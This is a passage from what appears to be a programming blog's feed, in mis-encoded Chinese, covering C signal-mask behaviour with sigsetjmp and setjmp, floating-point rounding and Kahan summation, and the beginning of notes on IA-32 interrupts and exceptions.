sigprocmask(SIG_BLOCK, <span class="literal">NULL</span>, &amp;blockmask);</span><br><span class="line">        <span class="keyword">if</span> (sigismember(&amp;blockmask, SIGINT))</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;in blockmask&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;not in blockmask&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (sigismember(&amp;pendmask, SIGINT))</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;in pendmask&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;not in pendmask&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">2</span>);<span class="comment">//æ—¶é—´é—´éš”æˆ‘ç–¯ç‹‚æŒ‰ctrl c :)</span></span><br><span class="line">    <span class="comment">// siglongjmp(env, 1);</span></span><br><span class="line">    longjmp(env, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨sigsetjmpæ—¶</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">^C^C^C^Cin blockmask</span><br><span class="line">in pendmask</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨setjmp</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">^C^C^C^Cin blockmask</span><br><span class="line">in pendmask</span><br></pre></td></tr></table></figure><p>WTF çœ‹æ¥æ˜¯æˆ‘ä¹‹å‰ç†è§£é”™äº†ï¼Œä»–ä»¬éƒ½ä¸ä¼šæ¸…é™¤å½“å‰çš„ä¿¡å·å±è”½å­—å’Œå·²ç»è¢«é˜»å¡ä½†å°šæœªå¤„ç†çš„ä¿¡å·é›†åˆ</p><p>gdbçœ‹ä¸‹</p><p>setjmp(env) !&#x3D; 0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p/x env</span><br><span class="line">$<span class="number">2</span> = &#123;&#123;</span><br><span class="line">    __jmpbuf = &#123;<span class="number">0x0</span>, <span class="number">0xfa3c37809f472823</span>, <span class="number">0x7fffffffdfd8</span>, <span class="number">0x555555555269</span>, <span class="number">0x555555557d78</span>, <span class="number">0x7ffff7ffd040</span>, <span class="number">0xfa3c378098a72823</span>, <span class="number">0xaf6962d587272823</span>&#125;,</span><br><span class="line">    __mask_was_saved = <span class="number">0x0</span>,</span><br><span class="line">    __saved_mask = &#123;</span><br><span class="line">      __val = &#123;<span class="number">0x0</span> &lt;repeats <span class="number">16</span> times&gt;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;&#125;</span><br></pre></td></tr></table></figure><p>sigsetjmp(env, 666) !&#x3D; 0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p/x env</span><br><span class="line">$<span class="number">2</span> = &#123;&#123;</span><br><span class="line">    __jmpbuf = &#123;<span class="number">0x0</span>, <span class="number">0x6cdae548d2b8f980</span>, <span class="number">0x7fffffffdfd8</span>, <span class="number">0x555555555269</span>, <span class="number">0x555555557d78</span>, <span class="number">0x7ffff7ffd040</span>, <span class="number">0x6cdae548d558f980</span>, <span class="number">0x398fb01dcad2f980</span>&#125;,</span><br><span class="line">    __mask_was_saved = <span class="number">0x1</span>,</span><br><span class="line">    __saved_mask = &#123;</span><br><span class="line">      __val = &#123;<span class="number">0x2</span>, <span class="number">0x0</span> &lt;repeats <span class="number">15</span> times&gt;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;&#125;</span><br></pre></td></tr></table></figure><p>sigsetjmpç¡®å®ä¿å­˜äº†signal mask</p><p>é‚£åº”è¯¥å°±æ˜¯sigsetjmpæœ€åä¼šæ¯”setjmpå¤šä¸€ä¸ªæ¢å¤è¿‡ç¨‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">jmp_buf env;</span><br><span class="line"><span class="type">sigset_t</span> mask, pendmask, blockmask;</span><br><span class="line"><span class="type">void</span> <span class="title function_">signal_handler</span><span class="params">(<span class="type">int</span> sig)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nctrl+\\\n&quot;</span>);</span><br><span class="line">    siglongjmp(env, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// longjmp(env, 1);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    assert(sigemptyset(&amp;mask)==<span class="number">0</span>);</span><br><span class="line">    sigemptyset(&amp;pendmask);</span><br><span class="line">    sigemptyset(&amp;blockmask);</span><br><span class="line">    sigaddset(&amp;mask, SIGINT);</span><br><span class="line">    sigprocmask(SIG_BLOCK, &amp;mask, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="type">__sighandler_t</span> rs = signal(SIGQUIT, signal_handler);<span class="comment">/*ctrl+\*/</span></span><br><span class="line">    assert(rs != SIG_ERR);</span><br><span class="line">    <span class="keyword">if</span> (sigsetjmp(env, <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// if (setjmp(env) != 0) &#123;</span></span><br><span class="line">        sigpending(&amp;pendmask);</span><br><span class="line">        sigprocmask(SIG_BLOCK, <span class="literal">NULL</span>, &amp;blockmask);</span><br><span class="line">        <span class="keyword">if</span> (sigismember(&amp;blockmask, SIGINT))</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;in blockmask&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;not in blockmask&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        sigprocmask(SIG_UNBLOCK, &amp;mask, <span class="literal">NULL</span>);<span class="comment">//å–æ¶ˆé˜»å¡</span></span><br><span class="line">    sleep(<span class="number">2</span>);<span class="comment">/*æŒ‰ä¸‹ctrl+\*/</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sigsetjmpæ—¶</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">^\</span><br><span class="line">ctrl+\</span><br><span class="line">in blockmask</span><br></pre></td></tr></table></figure><p>setjmpæ—¶</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">^\</span><br><span class="line">ctrl+\</span><br><span class="line">not in blockmask</span><br></pre></td></tr></table></figure><p>æ˜¯è¿™ä¸ªæ„æ€äº†ï¼Œè¿™ä¹ˆç®€å•çš„ä¸œè¥¿åˆšå¼€å§‹å±…ç„¶ç†è§£é”™äº†ï¼Œè‰¹</p><p>å®Œæˆä¸€ä¸‹æœ€åˆæƒ³åšçš„äº‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">jmp_buf env;</span><br><span class="line"><span class="type">void</span> <span class="title function_">signal_handler</span><span class="params">(<span class="type">int</span> sig)</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">    siglongjmp(env, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">__sighandler_t</span> rs = signal(SIGFPE, signal_handler);</span><br><span class="line">    assert(rs != SIG_ERR);</span><br><span class="line">    <span class="type">int</span> z = <span class="number">12</span>;</span><br><span class="line">    <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (sigsetjmp(env, <span class="number">1</span>) ==<span class="number">0</span> ) &#123;</span><br><span class="line">        z = z / t;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, z); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">xxx</span><br><span class="line">12</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kahan</title>
      <link href="/2023/04/23/floating-point-calculation-and-kahan/"/>
      <url>/2023/04/23/floating-point-calculation-and-kahan/</url>
      
        <content type="html"><![CDATA[<h2 id="Floating-point-Calculation"><a href="#Floating-point-Calculation" class="headerlink" title="Floating-point Calculation"></a>Floating-point Calculation</h2><p>Kahanå‰å¤ä¹ ä¸€äº›æµ®ç‚¹æ•°çš„è¿ç®—</p><p>A&#x3D;Ma*2<sup>Ea</sup></p><p>B&#x3D;Mb*2<sup>Eb</sup></p><p>å‡è®¾(Ea&gt;&#x3D;Eb)</p><p>AÂ±B&#x3D;(MaÂ±Mb*2<sup>Eb-Ea</sup>)*2<sup>Ea</sup></p><p>A*B&#x3D;(Ma*Mb)*2<sup>Ea+Eb</sup></p><p>A&#x2F;B&#x3D;(Ma&#x2F;Mb)*2<sup>Ea-Eb</sup></p><p>åŠ å‡æ³•å…ˆæ±‚é˜¶å·®ï¼Œå°çš„é˜¶ç å¾€å¤§çš„è½¬æ¢ï¼Œæ‰€ä»¥å°çš„é˜¶ç çš„æœ‰æ•ˆæ•°éœ€è¦å³ç§»ä¸¤é˜¶ç å·®çš„ç»å¯¹å€¼ï¼Œå¦‚æœå³ç§»çš„è¿‡ç¨‹ä¸­å‡ºç°ç§»å‡ºçš„æƒ…å†µï¼Œä¼šæŠŠç§»å‡ºçš„ä½ä¿å­˜åˆ°ä¸´æ—¶çš„é™„åŠ ä½ä¸Šï¼Œæœ‰æ•ˆæ•°ç›¸åŠ ï¼Œç»“æœè§„æ ¼åŒ–</p><p>è¿ç®—è¿‡ç¨‹ä¸­å¯èƒ½å‡ºç°ä»¥ä¸‹å‡ ç§æƒ…å†µ</p><ul><li>é™¤ä»¥0</li><li>é˜¶ç ä¸Šæº¢ï¼Œå•ç²¾åº¦&gt; 127 Â±inf</li><li>é˜¶ç ä¸‹æº¢å‡ºï¼Œå•ç²¾åº¦&lt; -126 Â± 0</li><li>æœ‰æ•ˆæ•°æº¢å‡º ä¾‹å¦‚11.01 éœ€è¦å³å½’ï¼Œéœ€è¦æŠŠå¯èƒ½ç§»å‡ºçš„ä½ä¿å­˜åˆ°ä¸´æ—¶é™„åŠ ä½ï¼Œè¿™é‡Œæœ€å¤šå³ç§»ä¸€ä½ï¼Œå› ä¸ºä¸¤æœ‰æ•ˆæ•°ä¹‹å’Œä¸å¯èƒ½è¾¾åˆ°4ï¼Œæ‰€ä»¥æœ‰æ•ˆæ•°æ•´æ•°éƒ¨åˆ†æœ€å¤š2ä½(11.)ï¼Œä¿ç•™ä¸€ä¸ª1(1.)ï¼Œæœ€å¤šå³ç§»ä¸€ä½</li><li>éè§„æ ¼åŒ–æœ‰æ•ˆæ•°ï¼Œå¦‚0.11 éœ€è¦å·¦å½’</li><li>æœ‰æ•ˆæ•°å…¨é›¶ï¼Œéœ€è¦æŠŠé˜¶ç ä¹Ÿç½®å…¨é›¶</li></ul><p>å› ä¸ºæœ‰äº†é™„åŠ ä½ç²¾åº¦ä¼šå¾—åˆ°æå‡ï¼Œä½†æ˜¯ä¹Ÿéœ€è¦ä¾é é™„åŠ ä½åšèˆå…¥</p><p>IEEE 754ç»™å‡ºäº†å››ç§roundingæ–¹å¼</p><ul><li>å°±è¿‘èˆå…¥(é»˜è®¤)<ul><li>èˆå…¥åˆ°æœ€æ¥è¿‘ï¼Œåœ¨ä¸€æ ·æ¥è¿‘çš„æƒ…å†µä¸‹å¶æ•°ä¼˜å…ˆ(äºŒè¿›åˆ¶é‡Œä»¥0ç»“å°¾çš„)</li></ul></li><li>å‘+infèˆå…¥</li><li>å‘-infèˆå…¥</li><li>å‘0èˆå…¥</li></ul><h2 id="Kahan"><a href="#Kahan" class="headerlink" title="Kahan"></a>Kahan</h2><p>å…ˆçœ‹æ®µä»£ç </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> TIMES 40000000</span></span><br><span class="line"><span class="type">float</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="type">float</span> test;</span><br><span class="line">test= <span class="number">1234567890</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%f\n&quot;</span>,test);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; TIMES; i++)&#123;</span><br><span class="line">    sum += <span class="number">0.1</span>;</span><br><span class="line">&#125;</span><br><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; gcc -O2 -o test test.c</span><br><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line"><span class="number">1234567936.000000</span></span><br><span class="line"><span class="number">2097152.000000</span></span><br></pre></td></tr></table></figure><p>ç»“æœå¹¶æ²¡æœ‰æˆ‘ä»¬æƒ³çš„é‚£æ ·ï¼Œè¯¯å·®éå¸¸å¤§</p><p>é€ æˆè¿™ç§ç°è±¡çš„åŸå› ä¸»è¦æœ‰</p><p>0.1åœ¨å†…çš„å¥½å¤šæ•°åœ¨æˆ‘ä»¬æµ®ç‚¹æ•°é‡Œçš„æ— æ³•ç²¾ç¡®è¡¨ç¤º 0 01111011 10011001100110011001101 æœ‰æ•ˆæ•°1001æ— æ•ˆå¾ªç¯ï¼Œç±»ä¼¼ä¸åè¿›åˆ¶çš„ä¸‰åˆ†ä¹‹ä¸€ï¼Œç›¸åŠ çš„æ—¶å€™ç”±äºéœ€è¦å°çš„é˜¶ç å¾€å¤§çš„è½¬æ¢ï¼Œå°çš„æœ‰æ•ˆæ•°éœ€è¦å³ç§»(æˆ‘ä»¬çš„é™„åŠ ä½æœ‰é™)ï¼Œä¸¤æ•°ç›¸å·®å°æ—¶ï¼Œç²¾åº¦æŸå¤±ï¼Œå½“ä¸¤æ•°ç›¸å·®è¿‡å¤§æ—¶ï¼Œç”šè‡³å­˜åœ¨å¤§æ•°åƒå°æ•°çš„æƒ…å†µ(å³ç§»æˆ0.0çš„æƒ…å†µ)ï¼ŒåŒæ—¶ç”±äºæˆ‘ä»¬å•ç²¾åº¦æµ®ç‚¹æ•°æœ‰æ•ˆæ•°æ˜¯23ä½ï¼Œå¤–åŠ ä¸€ä¸ªéšè—çš„1 å¯ä»¥è¡¨ç¤ºåè¿›åˆ¶æœ‰æ•ˆä½æ•°log(2<sup>24</sup>)çº¦ç­‰äº7ä½</p><p><strong>è¯¯å·®è¡¥å¿ç®—æ³•Kahan</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; TIMES; i++)&#123;</span><br><span class="line">    y = <span class="number">0.1</span> - c;</span><br><span class="line">    t = sum2 + y;</span><br><span class="line">    c = (t - sum2) - y;</span><br><span class="line">    sum2 = t;</span><br><span class="line">&#125;</span><br><span class="line">sum2-=cï¼›</span><br></pre></td></tr></table></figure><p>ä¸»è¦æ€æƒ³å°±æ˜¯è®¡ç®—å‡ºæ¯æ¬¡ç´¯è®¡çš„èˆå…¥è¯¯å·®ï¼Œæ·»åŠ åˆ°ä¸‹ä¸€æ¬¡è®¡ç®—ä¸Š</p><p>cæ˜¯å¯¹ä¸¢å¤±çš„ä½ä½è¿›è¡Œè¿ç®—è¡¥å¿çš„å˜é‡</p><p>å½“æˆ‘ä»¬çš„sum2å’Œyç›¸å·®è¿‡å¤§æ—¶ï¼Œtä¼šå¾—åˆ°ä¸€ä¸ªå·²ç»äº§ç”Ÿè¯¯å·®çš„å€¼ï¼Œæˆ‘ä»¬ç”¨è¿™ä¸ªå€¼å»å‡åŸæ¥çš„sum2(ä»–ä»¬çš„ä¸¤æ•°ç›¸å·®ä¸æ˜¯å¾ˆå¤§ï¼Œç»“æœæ¯”è¾ƒå‡†ç¡®)ç„¶åå‡å»è¿™æ¬¡çš„åŠ æ•°(åŒæ ·ä¸¤æ•°ç›¸å·®ä¸å¤§ï¼Œç»“æœå‡†ç¡®)å°±å¯ä»¥è®¡ç®—å‡ºè¿™æ¬¡è®¡ç®—çš„è¯¯å·®å€¼ï¼Œåœ¨ä¸‹ä¸€æ¬¡åŠ æ³•æ—¶å»ç”¨è¿™ä¸ªè¯¯å·®ä¿®æ­£ç»“æœ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TIMES 400000000</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">float</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">float</span> sum2 = <span class="number">0</span>, y = <span class="number">0</span>, t = <span class="number">0</span>, c = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; TIMES; i++) &#123;</span><br><span class="line">        sum += <span class="number">0.1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; TIMES; i++) &#123;</span><br><span class="line">        y = <span class="number">0.1</span> - c;</span><br><span class="line">        t = sum2 + y;</span><br><span class="line">        c = (t - sum2) - y;</span><br><span class="line">        sum2 = t;</span><br><span class="line">    &#125;</span><br><span class="line">    sum2 -= c;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%f\n&quot;</span>, sum);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%f&quot;</span>, sum2);</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; gcc -O2 -o test test.c</span><br><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">2097152.000000</span><br><span class="line">40000000.000000â  </span><br></pre></td></tr></table></figure><p>åŒæ—¶ä¹Ÿå¯ä»¥çœ‹åˆ°è¿™æ¬¡æˆ‘åœ¨TIMESæ¯”ç¬¬ä¸€æ¬¡åé¢å¤šåŠ äº†ä¸€ä¸ª0ï¼Œç¬¬ä¸€ç§ç´¯è®¡æ³•ç»“æœè¿˜æ˜¯2097152.000000,ä¹Ÿå°è¯äº†ç›¸å·®è¿‡å¤§æ—¶å¤§æ•°å­—ä¼šæŠŠå°æ•°å­—å®Œå…¨åƒæ‰ï¼Œæœ¬ä¾‹ä¸­0.1é˜¶ç 01111011&#x3D;123-127&#x3D;-4ï¼Œ2097152é˜¶ç 10010100&#x3D;148-127&#x3D;21</p><p>0.1æœ‰æ•ˆæ•°éœ€è¦å³ç§»25ä½ï¼Œä½†æ˜¯ä»–çš„æœ‰æ•ˆæ•°ç®—ä¸Šéšè—1æœ€å¤š24ä½ï¼Œæ¨æµ‹ä¸€ä¸‹åº”è¯¥æœ‰ä¸€ä½çš„é™„åŠ ä½ä½œä¿æŠ¤ä½</p><h2 id="9-21æ—¥è¡¥æ¡£GRS"><a href="#9-21æ—¥è¡¥æ¡£GRS" class="headerlink" title="9.21æ—¥è¡¥æ¡£GRS"></a>9.21æ—¥è¡¥æ¡£GRS</h2><p>IEE754æ ‡å‡†ä¿è¯æµ®ç‚¹æ•°èˆå…¥è¯¯å·®åœ¨0.5uplå†…</p><blockquote><p>ulp(units in the last place):<strong>æœ€åä¸€ä½ä¸Šçš„å•ä½å€¼</strong>æˆ–ç§°<strong>æœ€å°ç²¾åº¦å•ä½</strong></p></blockquote><p>ä¸ºäº†è¾¾åˆ°0.5uplè¯¯å·®ï¼Œåœ¨uplåå¤šåŠ äº†ä¿æŠ¤ä½Gï¼ˆguard bit),èˆå…¥ä½Rï¼ˆround bitï¼‰å’Œé»ç€ä½Sï¼ˆsticky bitï¼‰æ¥æå‡ç²¾åº¦</p><ul><li>èˆå…¥ä½å³ä¾§æœ‰éé›¶æ˜¯ç²˜åˆä½æ‰ç½®1</li></ul><p><a href="https://zhuanlan.zhihu.com/p/356960443">https://zhuanlan.zhihu.com/p/356960443</a> ï¼šèˆå…¥ä¸å¼‚å¸¸</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>IA32ä¸­æ–­å’Œå¼‚å¸¸(Interrupt And Exception)</title>
      <link href="/2023/04/22/IA32-Interrupt-Exception/"/>
      <url>/2023/04/22/IA32-Interrupt-Exception/</url>
      
        <content type="html"><![CDATA[<h1 id="IA32-Interrupt-And-Exception"><a href="#IA32-Interrupt-And-Exception" class="headerlink" title="IA32 Interrupt And Exception"></a>IA32 Interrupt And Exception</h1><p>ä¸åŒä½“ç³»æ¶æ„ä¸­æ–­å’Œå¼‚å¸¸çš„å®šä¹‰å†…æ¶µä¸å¤ªä¸€æ ·ï¼Œå¯ä»¥ç†è§£ï¼Œä½†æ˜¯åŒä¸€ä½“ç³»æ¶æ„çš„ä¸åŒæ•™ç§‘ä¹¦ä¹Ÿä¸å¤ªä¸€æ ·ï¼Œæ·¦äº†</p><p>æœ€åè¿˜æ˜¯å»è¯»äº†ä¸€æ³¢intelçš„æ‰‹å†Œ,RTFM!!!ï¼Œåœ¨64-ia-32-architectures-software-developer-vol-3a-part-1-manualçš„chapter 6</p><p><a href="https://www.intel.cn/content/www/cn/zh/architecture-and-technology/64-ia-32-architectures-software-developer-vol-3a-part-1-manual.html">https://www.intel.cn/content/www/cn/zh/architecture-and-technology/64-ia-32-architectures-software-developer-vol-3a-part-1-manual.html</a></p><h3 id="EFLAGSå¯„å­˜å™¨"><a href="#EFLAGSå¯„å­˜å™¨" class="headerlink" title="EFLAGSå¯„å­˜å™¨"></a>EFLAGSå¯„å­˜å™¨</h3><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230422194723461.png" alt="image-20230422194723461"></p><h2 id="Interrupt"><a href="#Interrupt" class="headerlink" title="Interrupt"></a>Interrupt</h2><p>The processor receives interrupts from two sources:<br>â€¢ External (hardware generated) interrupts.<br>â€¢ Software-generated interrupts.(å¦‚int næ¥è°ƒç”¨nä¸­æ–­)</p><p>é€šå¸¸æ˜¯ç”±CPUå¤–éƒ¨çš„è¾“å…¥è¾“å‡ºè®¾å¤‡ï¼ˆç¡¬ä»¶ï¼‰æ‰€è§¦å‘çš„ï¼Œå¸Œæœ›cpuåœä¸‹æ‰‹é‡Œçš„ä»»åŠ¡å»æ‰§è¡Œå¯¹åº”å¾—ä¸­æ–­å¤„ç†ç¨‹åºï¼Œä¹‹åå†å›åˆ°æ‰‹é‡Œä»»åŠ¡æ¥ï¼Œæ‰€ä»¥ä¸­æ–­æ˜¯å¼‚æ­¥çš„ï¼Œè¢«å«åšå¼‚æ­¥ä¸­æ–­æˆ–ç¡¬ä»¶ä¸­æ–­</p><p>cpuæä¾›äº†ä¸¤å¼•è„š</p><p>INTRï¼ˆINTeRruptï¼‰å¯å±è”½ä¸­æ–­(maskable interrupt)é€šè¿‡INTRå‘CPUå‘ç”Ÿè¯·æ±‚</p><p>NMIï¼ˆNon Maskable Interruptï¼‰ä¸å¯å±è”½ä¸­æ–­(nonmaskable interrupt)é€šè¿‡NMIå‘CPUå‘ç”Ÿè¯·æ±‚</p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230422194043252.png" alt="image-20230422194043252"></p><p>å¯ä»¥é€šè¿‡CLIæ¸…é™¤EFLAGSå¯„å­˜å™¨é‡ŒIF(Interrupt enable Flag)ä½(IF&#x3D;0)æ¥ç¦æ­¢å¯å±è”½ä¸­æ–­å‘ç”Ÿï¼ŒSTI(IF&#x3D;1)å…è®¸å¯å±è”½ä¸­æ–­å‘ç”Ÿ(IA32åªæœ‰åœ¨å“åº”ä¸­æ–­æ—¶æŠŠIF&#x3D;0å…³é—­ä¸­æ–­ï¼Œå“åº”å¼‚å¸¸çš„æ—¶å€™ä¸ä¼šå…³é—­)</p><p>ä¸å¯å±è”½ä¸­æ–­ï¼Œæ„å¦‚å…¶å</p><h2 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h2><p>The processor receives exceptions from three sources:<br>â€¢ Processor-detected program-error exceptions.<br>â€¢ Software-generated exceptions.<br>â€¢ Machine-check exceptions.</p><p>å¼‚å¸¸é€šå¸¸æ˜¯CPUåœ¨æ‰§è¡ŒæŒ‡ä»¤æ—¶å› ä¸ºæ£€æµ‹åˆ°é¢„å…ˆå®šä¹‰çš„æŸä¸ªæˆ–å¤šä¸ªæ¡ä»¶è€Œäº§ç”Ÿçš„åŒæ­¥äº‹ä»¶,åˆè¢«å«åšåŒæ­¥ä¸­æ–­ï¼Œæ¥è‡ªå¤„ç†å™¨å†…éƒ¨ï¼ŒIFä½åœ¨è¿™é‡Œä¸èµ·ä»»ä½•ä½œç”¨ï¼Œç«‹å³æ‰§è¡Œ</p><ul><li><p>æ•…éšœ(Fault)</p><blockquote><p>å¯èƒ½è¢«å¼‚å¸¸å¤„ç†ç¨‹åºä¿®å¤ï¼Œå¦‚æœä¿®å¤ï¼Œå†è¿”å›åˆ°å½“å‰å¼•èµ·å¼‚å¸¸çš„æŒ‡ä»¤ï¼Œæ¯”å¦‚è¯´æˆ‘ä»¬çš„ç¼ºé¡µå¼‚å¸¸ï¼ŒæŒ‡ä»¤å¼•ç”¨ä¸€ä¸ªè™šæ‹Ÿåœ°å€ï¼Œå‘ç°ä»–å¯¹åº”çš„çš„ç‰©ç†é¡µé¢ä¸åœ¨å†…å­˜ï¼Œå¼‚å¸¸å¤„ç†ç¨‹åºä¼šæŠŠå®ƒä»ç£ç›˜å–å‡ºæ¥æ”¾åˆ°å†…å­˜ï¼ŒåŠ è½½åå†å›åˆ°è¯¥æŒ‡ä»¤å°±å¯ä»¥æ­£å¸¸æ‰§è¡Œï¼Œä¿®å¤ä¸äº†ï¼Œç»ˆæ­¢</p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230422202900753.png" alt="image-20230422202900753"></p></blockquote></li><li><p>é™·é˜±(Traps)</p><blockquote><p>æœ‰æ„çš„å¼‚å¸¸ï¼Œæ‰§è¡Œå®Œé™·é˜±æŒ‡ä»¤åï¼ŒæŠ¥å‘Šç»™cpuå¼‚å¸¸ï¼Œæ¯”å¦‚æˆ‘ä»¬çš„int n(æœ‰çš„ä¹¦é‡ŒæŠŠè¿™ä¸ªå«åšè½¯ä¸­æ–­)ï¼Œint3, into(æº¢å‡ºæ£€æµ‹)ï¼Œbound(åœ°å€è¶Šç•Œæ£€æµ‹),ud2(æœªå®šä¹‰æŒ‡ä»¤)ç­‰ï¼Œæœ€é‡è¦çš„ä½œç”¨å°±æ˜¯æä¾›ç”¨æˆ·å’Œå†…æ ¸çš„æ¥å£â€“ç³»ç»Ÿè°ƒç”¨ï¼Œå¼‚å¸¸å¤„ç†ç¨‹åºçš„è¿”å›åœ°å€æŒ‡å‘å¯¼è‡´å¼‚å¸¸æŒ‡ä»¤çš„ä¸‹ä¸€ä¸ªæŒ‡ä»¤åœ°å€</p></blockquote></li><li><p>ç»ˆæ­¢(Aborts)</p><blockquote><p>ç›´æ¥ç»ˆæ­¢ï¼Œå¤„ç†ç¨‹åºå°†æ§åˆ¶è¿”å›ç»™ä¸€ä¸ªabortä¾‹ç¨‹ï¼Œè¯¥ä¾‹ç¨‹ä¼šç»ˆæ­¢è¿™ä¸ªåº”ç”¨ç¨‹åº</p></blockquote></li></ul><h2 id="ä¸­æ–­å‘é‡è¡¨ï¼ˆInterrupt-Vector-Tableï¼ŒIVTï¼‰"><a href="#ä¸­æ–­å‘é‡è¡¨ï¼ˆInterrupt-Vector-Tableï¼ŒIVTï¼‰" class="headerlink" title="ä¸­æ–­å‘é‡è¡¨ï¼ˆInterrupt Vector Tableï¼ŒIVTï¼‰"></a>ä¸­æ–­å‘é‡è¡¨ï¼ˆInterrupt Vector 